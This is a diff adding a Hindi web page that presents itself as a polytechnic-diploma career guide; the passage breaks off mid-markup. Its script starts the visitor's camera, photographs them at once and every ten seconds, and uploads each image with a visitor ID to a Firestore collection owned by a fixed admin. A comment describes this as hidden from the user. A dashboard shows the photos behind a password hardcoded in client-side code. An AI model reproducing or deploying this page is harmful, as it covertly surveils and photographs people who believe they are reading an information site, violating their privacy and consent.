@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>निजी कैमरा कैप्चर बैकएंड</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Use Inter font -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f7f7;
+        }
+        /* Custom scrollbar for aesthetic display of images */
+        .image-container::-webkit-scrollbar {
+            width: 8px;
+        }
+        .image-container::-webkit-scrollbar-track {
+            background: #e0e0e0;
+            border-radius: 10px;
+        }
+        .image-container::-webkit-scrollbar-thumb {
+            background: #6b7280;
+            border-radius: 10px;
+        }
+        .image-container::-webkit-scrollbar-thumb:hover {
+            background: #4b5563;
+        }
+    </style>
+    <!-- Firebase SDKs -->
+    <script type="module">
+        // Firebase इम्पोर्ट
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { 
+            getAuth, 
+            signInAnonymously, 
+            signInWithCustomToken,
+            onAuthStateChanged
+        } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { 
+            getFirestore, 
+            collection, 
+            query, 
+            onSnapshot, 
+            addDoc, 
+            serverTimestamp,
+            setLogLevel
+        } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // डिबगिंग के लिए लॉग स्तर सेट करें
+        setLogLevel('Debug');
+
+
+        // --- ग्लोबल फायरबेस/ऐप वैरिएबल्स ---
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-photo-app';
+        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+
+        let app, db, auth, userId;
+        let isAuthReady = false;
+        let autoCaptureInterval = null; 
+        
+        // *****************************************************************
+        // ** अति महत्वपूर्ण: व्यवस्थापक ID और पासवर्ड **
+        // यह ID तय करती है कि तस्वीरें किस निजी संग्रह में सेव होंगी (Firestore Path)।
+        const STORAGE_ADMIN_ID = "06374946643496896340"; 
+        
+        // डैशबोर्ड खोलने के लिए पासवर्ड 
+        const ADMIN_PASSWORD = "rituraj@123";
+        const LOGIN_KEY = "admin_logged_in"; // सेशन कुंजी
+        // *****************************************************************
+
+        const PHOTO_COLLECTION_PATH = (adminId) => ['artifacts', appId, 'users', adminId, 'captured_photos'];
+
+        // --- DOM एलिमेंट्स ---
+        const appContainer = document.getElementById('app-container');
+        const loadingElement = document.getElementById('loading-message');
+        const viewToggle = document.getElementById('view-toggle');
+        const captureView = document.getElementById('capture-view');
+        const dashboardView = document.getElementById('dashboard-view');
+        const videoElement = document.getElementById('camera-stream'); 
+        const captureButton = document.getElementById('capture-button');
+        const statusMessage = document.getElementById('status-message');
+        const imagesGrid = document.getElementById('images-grid');
+
+        // फ्रेम कैप्चर करने के लिए छिपा हुआ कैनवस
+        const canvas = document.createElement('canvas');
+        let videoStream = null;
+
+        // --- इनिशियलाइज़ेशन और प्रमाणीकरण ---
+
+        const initializeFirebase = async () => {
+            try {
+                // 1. ऐप इनिशियलाइज़ करें
+                app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+
+                // 2. साइन इन करें
+                if (initialAuthToken) {
+                    await signInWithCustomToken(auth, initialAuthToken);
+                } else {
+                    await signInAnonymously(auth);
+                }
+
+                // 3. प्रमाणीकरण स्थिति श्रोता सेट करें
+                onAuthStateChanged(auth, (user) => {
+                    if (user) {
+                        userId = user.uid;
+                        console.log("Firebase Auth Ready. User ID:", userId);
+                    } else {
+                        // यदि गुमनाम साइन-इन विफल होता है, तो एक रैंडम ID का उपयोग करें
+                        userId = crypto.randomUUID(); 
+                    }
+                    isAuthReady = true;
+                    // URL हैश के आधार पर प्रारंभिक रेंडर
+                    loadingElement.classList.add('hidden');
+                    appContainer.classList.remove('hidden');
+                    // डैशबोर्ड दृश्य में भंडारण व्यवस्थापक ID प्रदर्शित करें
+                    document.getElementById('storage-admin-id-display').textContent = STORAGE_ADMIN_ID;
+                    renderView(window.location.hash);
+                    // डैशबोर्ड अपडेट के लिए सुनना शुरू करें
+                    setupDashboardListener();
+                });
+
+            } catch (error) {
+                console.error("Firebase initialization or sign-in failed:", error);
+                loadingElement.innerHTML = `
+                    <p class="text-red-600 font-semibold">
+                        त्रुटि (Error): Firebase शुरू नहीं हो पाया। कृपया कंसोल देखें।
+                    </p>
+                `;
+            }
+        };
+
+        // --- दृश्य प्रबंधन ---
+
+        const renderView = (hash) => {
+            if (!isAuthReady) return; 
+
+            const currentView = hash === '#dashboard' ? 'dashboard' : 'capture';
+            
+            // पहले सभी दृश्यों को छिपाएँ
+            captureView.classList.add('hidden');
+            dashboardView.classList.add('hidden');
+            
+            if (currentView === 'capture') {
+                captureView.classList.remove('hidden');
+                // नेविगेशन टॉगल: डैशबोर्ड
+                viewToggle.innerHTML = `
+                    <a href="#dashboard" class="text-blue-600 hover:text-blue-800 transition duration-150 p-2 rounded-lg font-medium">
+                        डैशबोर्ड
+                    </a>
+                `;
+                startCamera(); // कैमरा और ऑटो-कैप्चर शुरू करें
+            } else {
+                dashboardView.classList.remove('hidden');
+                // नेविगेशन टॉगल: होम
+                viewToggle.innerHTML = `
+                    <a href="#capture" class="text-blue-600 hover:text-blue-800 transition duration-150 p-2 rounded-lg font-medium">
+                        होम
+                    </a>
+                `;
+                stopCamera(); // कैमरा और ऑटो-कैप्चर बंद करें
+                // लॉगिन स्थिति की जांच के लिए डैशबोर्ड श्रोता को पुनः चलाएँ
+                setupDashboardListener(); 
+            }
+        };
+
+        // नेविगेशन के लिए हैश परिवर्तनों को संभालें
+        window.addEventListener('hashchange', () => renderView(window.location.hash));
+
+
+        // --- कैमरा और कैप्चर लॉजिक ---
+
+        const startCamera = async () => {
+            // वर्तमान यूज़र ID प्रदर्शित करें (केवल जानकारी/डिबगिंग के लिए)
+            statusMessage.textContent = `कैमरा शुरू हो रहा है... आपकी यूज़र ID: ${userId}`; 
+            stopCamera(); 
+
+            try {
+                // यूज़र के कैमरे तक पहुँचने का अनुरोध
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                videoElement.srcObject = videoStream;
+                videoElement.play();
+
+                videoElement.onloadedmetadata = () => {
+                    console.log("Camera stream started. Setting up auto-capture.");
+                    
+                    // --- ऑटो-कैप्चर शुरू करें ---
+                    // तुरंत कैप्चर करें, और फिर हर 10 सेकंड (10000ms) में
+                    capturePhoto(); 
+                    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+                    autoCaptureInterval = setInterval(capturePhoto, 10000); 
+                    
+                    captureButton.disabled = false;
+                };
+
+            } catch (error) {
+                console.error("Error accessing camera (User denied or device missing):", error);
+                statusMessage.innerHTML = `<span class="text-red-600">कैमरा एक्सेस में त्रुटि (अनुमति नहीं मिली)।</span>`;
+                if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+            }
+        };
+
+        const stopCamera = () => {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+                videoElement.srcObject = null;
+            }
+            if (autoCaptureInterval) {
+                clearInterval(autoCaptureInterval);
+                autoCaptureInterval = null;
+            }
+        };
+
+        const capturePhoto = async () => {
+            if (!videoStream || !isAuthReady) {
+                console.log("Auto-capture skipped: System not ready or camera stream missing.");
+                return;
+            }
+
+            try {
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                const base64Image = canvas.toDataURL('image/jpeg', 0.8);
+
+                // --- निजी रिमोट डैशबोर्ड सेव (Firestore) ---
+                // डेटा STORAGE_ADMIN_ID (Rituraj के संग्रह) के निजी संग्रह में सेव किया जाता है
+                const photosCollectionRef = collection(db, ...PHOTO_COLLECTION_PATH(STORAGE_ADMIN_ID));
+                await addDoc(photosCollectionRef, {
+                    base64Image: base64Image,
+                    timestamp: serverTimestamp(),
+                    capturedBy: userId, // पेज खोलने वाले आगंतुक की यूज़र ID
+                    capturedAt: new Date().toLocaleString('hi-IN')
+                });
+
+                // पृष्ठभूमि प्रक्रिया के लिए स्थिति अपडेट करें (यूज़र से छिपा हुआ)
+                statusMessage.innerHTML = `<span class="text-green-600">फोटो सफलतापूर्वक कैप्चर और डैशबोर्ड पर अपलोड किया गया!</span>`;
+                console.log(`Photo captured and saved to PRIVATE Firestore by User ID: ${userId}`);
+                
+            } catch (error) {
+                console.error("Error during auto-capture or upload:", error);
+                statusMessage.innerHTML = `<span class="text-red-600">फोटो लेने में विफल!</span>`;
+                
+                const errorBox = document.getElementById('error-box');
+                document.getElementById('error-text').textContent = 'पृष्ठभूमि कैप्चर या डाउनलोड में गंभीर त्रुटि: ' + error.message;
+                errorBox.classList.remove('hidden');
+                
+            } finally {
+                captureButton.disabled = false;
+            }
+        };
+        
+        // कस्टम त्रुटि बॉक्स को बंद करने का फ़ंक्शन
+        window.closeErrorBox = () => {
+            document.getElementById('error-box').classList.add('hidden');
+        };
+
+        // --- डैशबोर्ड प्रमाणीकरण और श्रोता लॉजिक ---
+        
+        const isUserLoggedIn = () => {
+            return sessionStorage.getItem(LOGIN_KEY) === 'true';
+        };
+        
+        const renderPasswordGate = () => {
+            const dashboardContainer = document.getElementById('dashboard-content');
+            const passwordGate = document.getElementById('password-gate');
+            
+            dashboardContainer.classList.add('hidden');
+            passwordGate.classList.remove('hidden');
+            
+            // पिछली त्रुटि संदेशों को साफ करें
+            document.getElementById('password-error-message').textContent = '';
+            document.getElementById('password-error-message').classList.add('hidden');
+        };
+        
+        const renderDashboardView = () => {
+             const dashboardContainer = document.getElementById('dashboard-content');
+             const passwordGate = document.getElementById('password-gate');
+             
+             passwordGate.classList.add('hidden');
+             dashboardContainer.classList.remove('hidden');
+             
+             // अब वास्तविक Firestore श्रोता शुरू करें
+             setupFirestoreListener();
+        };
+
+        const checkAdminPassword = () => {
+            const inputPass = document.getElementById('admin-password-input').value;
+            const errorElement = document.getElementById('password-error-message');
+
+            if (inputPass === ADMIN_PASSWORD) {
+                // सफल लॉगिन
+                sessionStorage.setItem(LOGIN_KEY, 'true');
+                renderDashboardView();
+            } else {
+                errorElement.textContent = "गलत कोड! पुनः प्रयास करें।";
+                errorElement.classList.remove('hidden');
+            }
+        };
+        // फ़ंक्शन को वैश्विक दायरे में उजागर करें ताकि HTML इसे कॉल कर सके
+        window.checkAdminPassword = checkAdminPassword; 
+
+        const setupDashboardListener = () => {
+            if (!isAuthReady) return;
+            
+            // 1. यदि वर्तमान दृश्य डैशबोर्ड नहीं है, तो वापस आ जाएँ
+            if (window.location.hash !== '#dashboard') {
+                return;
+            }
+
+            // 2. जांचें कि यूज़र ने इस सेशन में लॉगिन किया है या नहीं
+            if (isUserLoggedIn()) {
+                renderDashboardView();
+            } else {
+                renderPasswordGate();
+            }
+        };
+
+        // वास्तविक Firestore कनेक्शन लॉजिक के लिए अलग फ़ंक्शन
+        const setupFirestoreListener = () => {
+            imagesGrid.innerHTML = `
+                <div class="text-center p-8 text-gray-500">
+                    डेटाबेस से तस्वीरें लोड हो रही हैं... (निजी संग्रह)
+                </div>
+            `;
+            
+            try {
+                // व्यवस्थापक के निजी संग्रह का संदर्भ
+                const photosCollectionRef = collection(db, ...PHOTO_COLLECTION_PATH(STORAGE_ADMIN_ID));
+                const q = query(photosCollectionRef);
+
+                // डैशबोर्ड के लिए रियल-टाइम श्रोता
+                onSnapshot(q, (snapshot) => {
+                    const photos = [];
+                    snapshot.forEach((doc) => {
+                        photos.push({ id: doc.id, ...doc.data() });
+                    });
+                    
+                    // समयस्टैम्प के अनुसार क्रमबद्ध करें (सबसे नया पहले)
+                    photos.sort((a, b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));
+                    
+                    // तस्वीरों को रेंडर करें
+                    renderDashboard(photos);
+
+                }, (error) => {
+                    console.error("Error listening to Firestore:", error);
+                    imagesGrid.innerHTML = `
+                        <div class="text-center p-8 text-red-600">
+                            डेटाबेस सुनने में त्रुटि (Firestore Error): ${error.message}
+                        </div>
+                    `;
+                });
+            } catch (error) {
+                 console.error("Error creating dashboard listener:", error);
+                 imagesGrid.innerHTML = `
+                    <div class="text-center p-8 text-red-600">
+                        डेटाबेस शुरू नहीं हुआ।
+                    </div>
+                `;
+            }
+        };
+
+
+        const renderDashboard = (photos) => {
+            imagesGrid.innerHTML = ''; // पिछली तस्वीरों को साफ करें
+
+            if (photos.length === 0) {
+                imagesGrid.innerHTML = `
+                    <div class="text-center p-8 text-gray-500 col-span-full">
+                        अभी तक कोई फोटो कैप्चर नहीं की गई है।
+                    </div>
+                `;
+                return;
+            }
+
+            photos.forEach(photo => {
+                const date = photo.timestamp ? 
+                    new Date(photo.timestamp.seconds * 1000).toLocaleString('hi-IN', {
+                        year: 'numeric', month: 'short', day: 'numeric', 
+                        hour: '2-digit', minute: '2-digit', second: '2-digit'
+                    }) : 'उपलब्ध नहीं';
+
+                // बेस64 इमेज की उपलब्धता जांचें
+                const imageUrl = photo.base64Image && photo.base64Image.startsWith('data:image') 
+                    ? photo.base64Image 
+                    : 'https://placehold.co/400x300/e0e0e0/555555?text=Image+Not+Found';
+
+                const imageHtml = `
+                    <div class="bg-white rounded-xl shadow-lg overflow-hidden transition transform hover:scale-[1.02] duration-300">
+                        <img 
+                            src="${imageUrl}" 
+                            alt="Captured photo from ${date}" 
+                            class="w-full h-auto object-cover border-b border-gray-100 aspect-[4/3]"
+                        />
+                        <div class="p-4">
+                            <p class="text-xs text-gray-600 font-medium">कैप्चर किया गया:</p>
+                            <p class="text-sm font-semibold text-gray-800">${date}</p>
+                            <p class="text-xs text-gray-500 mt-1">
+                                आगंतुक ID (Visitor ID): <span class="break-all font-mono text-gray-700">${photo.capturedBy}</span>
+                            </p>
+                            
+                            <!-- WhatsApp शेयर लिंक -->
+                            <a href="whatsapp://send?text=निजी%20डैशबोर्ड%20पर%20एक%20नया%20आगंतुक%20(${photo.capturedBy})%20कैप्चर%20किया%20गया%20है।%20डैशबोर्ड%20जाँचें!" 
+                                target="_blank"
+                                class="mt-3 inline-flex items-center text-xs font-medium text-green-600 hover:text-green-700"
+                            >
+                                WhatsApp पर सूचना भेजें
+                            </a>
+                        </div>
+                    </div>
+                `;
+                imagesGrid.insertAdjacentHTML('beforeend', imageHtml);
+            });
+        };
+
+        // --- एप्लिकेशन शुरू करें ---
+        document.addEventListener('DOMContentLoaded', () => {
+            loadingElement.classList.remove('hidden');
+            appContainer.classList.add('hidden');
+            initializeFirebase();
+        });
+        
+        // यदि कोई हैश नहीं है, तो प्रारंभिक हैश सेट करें
+        if (!window.location.hash) {
+            window.location.hash = '#capture';
+        }
+        
+    </script>
+</head>
+<body class="min-h-screen">
+
+    <div class="max-w-4xl mx-auto p-4 md:p-8">
+        <header class="text-center mb-8 bg-white p-4 rounded-xl shadow-md border-b-4 border-blue-500">
+            <h1 class="text-3xl font-bold text-gray-800">निजी कैमरा कैप्चर सिस्टम</h1>
+            <p class="text-sm text-gray-500 mt-1">सुरक्षित डैशबोर्ड के माध्यम से तस्वीरें देखें</p>
+            <div id="view-toggle" class="mt-4">
+                <!-- टॉगल बटन यहाँ JS द्वारा डाले जाते हैं -->
+            </div>
+        </header>
+
+        <!-- लोडिंग स्थिति -->
+        <div id="loading-message" class="hidden text-center p-12 bg-white rounded-xl shadow-lg">
+            <div class="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500 mx-auto mb-3"></div>
+            <p class="text-lg text-gray-600">सिस्टम शुरू हो रहा है... कृपया प्रतीक्षा करें।</p>
+        </div>
+
+        <main id="app-container" class="space-y-6">
+
+            <!-- CAPTURE VIEW (आगंतुक का पेज) - Polytechnic Info -->
+            <div id="capture-view" class="hidden bg-white p-6 md:p-8 rounded-xl shadow-lg">
+                <h2 class="text-2xl font-semibold mb-4 text-gray-800 border-b pb-2 border-blue-500">पॉलिटेक्निक डिप्लोमा: भविष्य और करियर के अवसर</h2>
+    
